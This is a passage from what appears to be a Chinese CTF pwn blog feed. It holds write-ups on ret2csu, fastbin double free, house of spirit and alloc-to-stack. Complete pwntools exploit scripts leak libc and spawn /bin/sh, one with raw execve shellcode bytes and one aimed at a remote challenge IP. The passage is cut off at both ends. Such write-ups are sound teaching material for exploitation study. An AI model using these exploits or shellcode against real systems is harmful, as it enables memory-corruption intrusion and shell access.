class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteHeap</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DeleteHeap(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu及例题</title>
      <link href="/posts/2856.html"/>
      <url>/posts/2856.html</url>
      
        <content type="html"><![CDATA[<p>写到newstar的week2才发现一直没写过有关ret2csu的博客，刚好有例题，乘着这个机会写个相关的知识点介绍</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410222110067.png" alt="image-20241022211034015"></p><blockquote><p>一般在二进制文件中一般有这样的两个函数，大部分的文件都有，我们今天的的csu的汇编就是在这两函数的下面</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410222113385.png" alt="image-20241022211309321"></p><blockquote><p>这就是我们今天的主角</p></blockquote><blockquote><p>先来介绍一下这两函数</p></blockquote><blockquote><p>下面的部分函数（我们称之为csu2）<strong>（主要是改变寄存器的值）</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loc_4013A6:                           </span><br><span class="line">                 add     rsp, 8</span><br><span class="line">                 pop     rbx</span><br><span class="line">                 pop     rbp</span><br><span class="line">                 pop     r12</span><br><span class="line">                 pop     r13</span><br><span class="line">                 pop     r14</span><br><span class="line">                 pop     r15</span><br><span class="line">                 retn</span><br></pre></td></tr></table></figure><blockquote><p>这段代码应该都看的懂，就是先把rsp栈顶寄存器+8，再依次把参数弹入相应的寄存器中去</p><p><strong>在这个漏洞利用之中一般都是先利用下面的条件进行寄存器值的改变，最后再调用csu1进行执行</strong></p></blockquote><blockquote><p>上面的部分函数(我们姑且称之为csu1)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loc_401390:</span><br><span class="line"></span><br><span class="line">mov     rdx, r14</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     edi, r12d</span><br><span class="line">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">add     rbx, 1</span><br><span class="line">cmp     rbp, rbx</span><br><span class="line">jnz     short loc_401390  //jnz是不相等是跳转，我们不想再来一遍，所以要让rbp与rbx的值相等</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br></pre></td></tr></table></figure><blockquote><p>这个函数是整个过程的重中之重，是call （r15的地址加上rbx的地址*8）里面的函数</p><p>一般我们会选择讲rbx的值设置为0（csu2），所以这里一般是call r15里面的函数（如果是调用指定的函数应是got表），这里是直接调用地址里面的函数，所以不是直接调用plt表</p></blockquote><h2 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h2><blockquote><p>1.有足够的溢出空间</p><p>2.关键寄存器的改变找不到</p></blockquote><p>刚刚好有个题目完美符合条件</p><h1 id="例题：newstar-2024-week2-My-GBC"><a href="#例题：newstar-2024-week2-My-GBC" class="headerlink" title="例题：newstar 2024 week2 My_GBC!!!!!"></a>例题：newstar 2024 week2 My_GBC!!!!!</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410222141814.png" alt="image-20241022214112686"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410222142717.png" alt="image-20241022214214679"></p><p>就开了NX保护，上面的主函数中可以看到很明显的栈溢出漏洞</p><p>不过这道题目有个坑点，它对我们输入的数据进行了加密</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410222152375.png" alt="image-20241022215250287"></p><p>点入加密函数，我们发现逻辑非常简单，每个字节异或一个key，再左移3位</p><p>我们写出解密函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def rol(byte, shift):</span><br><span class="line">    &quot;&quot;&quot;左循环移位操作&quot;&quot;&quot;</span><br><span class="line">    return ((byte &lt;&lt; shift) &amp; 0xFF) | (byte &gt;&gt; (8 - shift))</span><br><span class="line"></span><br><span class="line">def ror(byte, shift):</span><br><span class="line">    &quot;&quot;&quot;右循环移位操作&quot;&quot;&quot;</span><br><span class="line">    return (byte &gt;&gt; shift) | ((byte &lt;&lt; (8 - shift)) &amp; 0xFF)</span><br><span class="line"></span><br><span class="line">def decrypt(payload, key):</span><br><span class="line">    &quot;&quot;&quot;解密函数&quot;&quot;&quot;</span><br><span class="line">    length = len(payload)</span><br><span class="line">    decrypted_data = bytearray(length)  # 用于存储解密后的数据</span><br><span class="line"></span><br><span class="line">    for i in range(length):</span><br><span class="line">        # 先进行右循环移位操作</span><br><span class="line">        shifted_byte = ror(payload[i], 3)</span><br><span class="line">        # 然后进行异或操作</span><br><span class="line">        decrypted_data[i] = shifted_byte ^ key</span><br><span class="line"></span><br><span class="line">    return decrypted_data</span><br></pre></td></tr></table></figure><p>这是我们想retlibc时发现没有pop rdx来指定write函数泄露的字节，write只能打印出1个字节，这样肯定是不能泄露出libc的地址的，所以我们只能靠csu了</p><p>思路出来了，脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;8.147.132.32&#x27;,34489)</span><br><span class="line"></span><br><span class="line">def rol(byte, shift):</span><br><span class="line">    &quot;&quot;&quot;左循环移位操作&quot;&quot;&quot;</span><br><span class="line">    return ((byte &lt;&lt; shift) &amp; 0xFF) | (byte &gt;&gt; (8 - shift))</span><br><span class="line"></span><br><span class="line">def ror(byte, shift):</span><br><span class="line">    &quot;&quot;&quot;右循环移位操作&quot;&quot;&quot;</span><br><span class="line">    return (byte &gt;&gt; shift) | ((byte &lt;&lt; (8 - shift)) &amp; 0xFF)</span><br><span class="line"></span><br><span class="line">def decrypt(payload, key):</span><br><span class="line">    &quot;&quot;&quot;解密函数&quot;&quot;&quot;</span><br><span class="line">    length = len(payload)</span><br><span class="line">    decrypted_data = bytearray(length)  # 用于存储解密后的数据</span><br><span class="line"></span><br><span class="line">    for i in range(length):</span><br><span class="line">        # 先进行右循环移位操作</span><br><span class="line">        shifted_byte = ror(payload[i], 3)</span><br><span class="line">        # 然后进行异或操作</span><br><span class="line">        decrypted_data[i] = shifted_byte ^ key</span><br><span class="line"></span><br><span class="line">    return decrypted_data</span><br><span class="line"></span><br><span class="line"># 示例用法</span><br><span class="line">key = 0x5A  # 假设的密钥</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">write=0x4012f8</span><br><span class="line">pop_rdi=0x4013b3 </span><br><span class="line">pop_rsi=0x4013b1</span><br><span class="line">pop_rbp=0x40115d</span><br><span class="line">csu_addr=0x401390</span><br><span class="line">csu1_addr=0x4013AA</span><br><span class="line">write_plt=elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">ret=0x40101a</span><br><span class="line">offset=16</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu1(rbx, rbp, r12, r13, r14, r15):</span><br><span class="line">    payload=p64(csu1_addr)</span><br><span class="line">    payload+=p64(rbx)</span><br><span class="line">    payload+=p64(rbp)</span><br><span class="line">    payload+=p64(r12)</span><br><span class="line">    payload+=p64(r13)</span><br><span class="line">    payload+=p64(r14)</span><br><span class="line">    payload+=p64(r15)</span><br><span class="line">    return payload</span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15):</span><br><span class="line">    payload=csu1(rbx, rbp, r12, r13, r14, r15)</span><br><span class="line">    payload+=p64(csu_addr)</span><br><span class="line"></span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">payload1=b&#x27;a&#x27;*0x18+csu(0,1,1,write_got,8,write_got)+b&#x27;a&#x27;*56+p64(main_addr)</span><br><span class="line"></span><br><span class="line">payload2=decrypt(payload1,key)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))-libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">print(hex(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload3=b&#x27;a&#x27;*0x18+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">payload4=decrypt(payload3,key)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;ing:&#x27;,payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>没看懂可以看这里有个师傅讲解了</p><p><a href="https://www.bilibili.com/video/BV1qzyTYvEtX/?spm_id_from=333.999.0.0">newstar第二周pwn讲解录屏_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn-栈学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastbin_attack</title>
      <link href="/posts/460.html"/>
      <url>/posts/460.html</url>
      
        <content type="html"><![CDATA[<h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><p>这里的版本是2.23的glibc</p><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><p>double free就是在一个函数中重复free了一个chunk</p><p>假设有这样的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*p1=malloc(0x10) ; //chunk1</span><br><span class="line">*p2=malloc(0x10);</span><br><span class="line">*p3=malloc(0x10);</span><br><span class="line"></span><br><span class="line">free(p1);</span><br><span class="line">free(p2);</span><br><span class="line">free(p3);</span><br></pre></td></tr></table></figure><p>这个时候fastbin中的指针会是这个样子</p><p>fastbin[20]–&gt;chunk3—&gt;chunk2—-&gt;chunk1</p><p>这个时候如果我们这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*p1=malloc(0x10) ; //chunk1</span><br><span class="line">*p2=malloc(0x10);  //chunk2</span><br><span class="line"></span><br><span class="line">free(p1);</span><br><span class="line">free(p2);</span><br><span class="line">free(p1);</span><br></pre></td></tr></table></figure><p>fastbin[20]–&gt;chunk1—&gt;chunk2&lt;—-chunk1</p><p>这个时候molloc(0x10)</p><p>改写chunk1中的fd的地址使其指到bss段</p><p>这样</p><p>fastbin[20]–&gt;chunk2—&gt;chunk1—&gt;bss</p><p>连续malloc三次就可以得到一个可读可写的heap段</p><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>这个利用手段就是通过溢出等手段，直接free一个地址（没有被malloc）自己伪造的堆块，后面在molloc回来，这样，你就获得了那块位置的读写权，如果你伪造的地址处放着rbp,就可以放system &#x2F;binsh\x00了</p><p>伪造堆块的检查条件有几个</p><p>1.fake_chunk的ISMMAP的位置不能是1，不然系统就会认为这个heap是mmap的chunk导致一些错误</p><p>2.地址要对齐，如XXX0,XXXX8(64位)</p><p>3.fake_chunk的大小有限制</p><blockquote><p>伪造 <code>fake_chunk</code> 时，大小必须是 <code>2 * SIZE_SZ</code> 的倍数。如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会自动调整为最小的符合要求的倍数。32 位系统中，<code>SIZE_SZ</code> 为 4，64 位系统中为 8。chunk 大小最大不能超过 <code>av-&gt;system_mem</code>（128KB）。</p><p>为了确保伪造的 chunk 能挂在 <code>fastbin</code> 中，<code>next_chunk</code> 的大小通常设置为略大于 <code>fastbin</code> 最大值，但小于 128KB。这样在 chunk 释放时，伪造的 chunk 会插入 <code>fastbin</code>，随后可以通过再次分配相同大小的块来控制伪造的 chunk</p></blockquote><h3 id="例题：lctf2016-pwn200"><a href="#例题：lctf2016-pwn200" class="headerlink" title="例题：lctf2016_pwn200"></a>例题：<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954704.png" alt="2-0"></p><p>保护全关</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954705.png" alt="2-3"></p><p>第一个函数，也就是who are u?这里存在off by one的漏洞，可以通过溢出倒是v2把后面的地址泄露出来</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954706.png" alt="2-1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954707.png" alt="2-2"></p><p>这里可以看到会泄露出0x7ffc3777ed10这个地址</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954708.png" alt="2-4"></p><p>这里我们打印出来了泄露的地址的，因为我们写入的地址在栈上同样可以看见，我们直接计算这两地址之间的偏移(0x7ffed1ee3160-0x7ffed1ee3110)，从而直接得到我们输入位置的地址（后面直接在开始的地址写入shellcode），之后方便直接调用</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954709.png" alt="2-5"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954710.png" alt="2-6"></p><p>这里buf有个溢出，可以溢出到dest处</p><p>从而可以直接决定ptr这个变量的内容（free函数是free这个变量）</p><p><strong>这个就是我们house of spirit漏洞的核心点</strong></p><p>接下来我们要伪造堆块了</p><p>我们先要看give me your id ~~?”后面的值在哪</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954711.png" alt="2-7"></p><p>这里选择输入123泄露位置</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954712.png" alt="2-8"></p><p>这里可以看到我们输入的bbbbbbbbcccccccc</p><p>看到123（0x7b）的位置在0x7ffdd80a3638处（可以控制）</p><p>而我们的溢出点替换掉dest的点在0x7ffdd80a3608处（伪造chunkd的地址）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954713.png" alt="2-10"></p><p><a href="https://www.cnblogs.com/haidragon/p/17016393.html">图片来源</a></p><p>上面这张图片里面0x40前面我们可以控制，0x70处我们同样可以控制，可以在这里伪造一个fake_chunk，为了让0x70处就是next_chunk的previse_size(绕过检查),我们伪造的chunk大小应该是0x41就刚刚好</p><p>因此伪造chunk的地址是0x30处，经过gdb调试时rbp-0x90</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954714.png" alt="2-11"></p><p>在free后面，我们可以看到，我们本来的chunk没有被free掉，但是此时fastbin里面有地址，就是我们伪造的chunk</p><p>free掉后我们在把chunk malloc回来</p><p>这样我们就可以改写这个堆块了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954715.png" alt="2-12"></p><p>这里看到read在buf处</p><p>在函数结束后的rbp是buf+0x10</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954716.png" alt="2-13"></p><p>所以我们的返回地址应该是buf+0x18处，也就是前面写好的shellcode的位置</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954717.png" alt="2-14"></p><p>最后放上这个题目的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,27147)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">sh=b&#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><span class="line">payload=sh+ (0x30- len(sh))*b&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;u?&#x27;,payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">rbp=u64(p.recv(6).ljust(8,b&#x27;\0&#x27;))</span><br><span class="line">buf_addr=rbp-0x50</span><br><span class="line">print(hex(rbp))</span><br><span class="line">print(hex(buf_addr))</span><br><span class="line"></span><br><span class="line">fake_addr=rbp-0x90</span><br><span class="line">fake_chunk=p64(0)*5+p64(0x41)+p64(0)</span><br><span class="line">fake_chunk+=p64(fake_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#fake_chunk=b&#x27;b&#x27;*0x10+b&#x27;c&#x27;*0x18+b&#x27;d&#x27;*8</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;give me your id ~~?&#x27;,b&#x27;40&#x27;)</span><br><span class="line">p.sendafter(b&#x27;give me money~&#x27;,fake_chunk)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice : &#x27;)</span><br><span class="line">p.sendline(&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;how long?&#x27;,b&#x27;50&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x18+p64(buf_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;50\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;our choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Alloc-to-stack"><a href="#Alloc-to-stack" class="headerlink" title="Alloc_to_stack"></a>Alloc_to_stack</h2><p>这个漏洞就是在改写chunk的fd指针为想要的地址，从而达到想要地址伪造堆块，从而改写rbp等….</p><p>拿wiki上面的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _chunk</span><br><span class="line">&#123;</span><br><span class="line">    long long pre_size;</span><br><span class="line">    long long size;</span><br><span class="line">    long long fd;</span><br><span class="line">    long long bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=0x21;</span><br><span class="line">    chunk1=malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=&amp;stack_chunk;</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    chunk_a=malloc(0x10);</span><br><span class="line">    printf(&quot;%p&quot;,chunk_a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> gcc test.c -o test -O0 -g -z execstack -z norelro -fno-stack-protector -no-pie</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954718.png" alt="3-1"></p><p>这里断在free前面，可以看到申请了一个chunk</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954719.png" alt="3-2"></p><p>free掉之后，被放到了fastbin里面去</p><p>接着改写了chunk1的fd指针</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954720.png" alt="3-3"></p><p>可以看到fd指针改变后，fastbin里面的链表也发生了变化</p><p>接着连续malloc两个chunk</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954721.png" alt="3-4"></p><p>可以看到我们输入的fd处成功成为了一个堆块</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>这个的利用方法和前面的的alloc_to_stack一样，就是把stack的地址改成了其他段的地址，然后通过改变指定的函数地址获得shell</p><h3 id="例题：0ctf-2017-babyheap"><a href="#例题：0ctf-2017-babyheap" class="headerlink" title="例题：0ctf_2017_babyheap"></a>例题：0ctf_2017_babyheap</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954722.png" alt="4-1"></p><p>保护全开（<del>这我打个鸡毛啊</del>）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954723.png" alt="4-2"></p><p>菜单</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954724.png" alt="4-3"></p><p>其他的函数挺正常的，这里在修改的位置没有限制修改的长度，存在堆溢出漏洞</p><h4 id="我们先创建6个堆快"><a href="#我们先创建6个堆快" class="headerlink" title="我们先创建6个堆快"></a>我们先创建6个堆快</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x80)</span><br><span class="line">allo(0x70)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954725.png" alt="4-4"></p><p>前四个用来溢出</p><p>第五个用来泄露main_arena的地址</p><p>第六个用来防止chunk之间的合并</p><h4 id="先释放第三个堆块，再释放第二个堆快"><a href="#先释放第三个堆块，再释放第二个堆快" class="headerlink" title="先释放第三个堆块，再释放第二个堆快"></a>先释放第三个堆块，再释放第二个堆快</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">free(1)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954726.png" alt="4-5"></p><p>这里看到bin中的链表</p><h4 id="我们通过chunk0进行堆溢出，使chunk1-chunk5"><a href="#我们通过chunk0进行堆溢出，使chunk1-chunk5" class="headerlink" 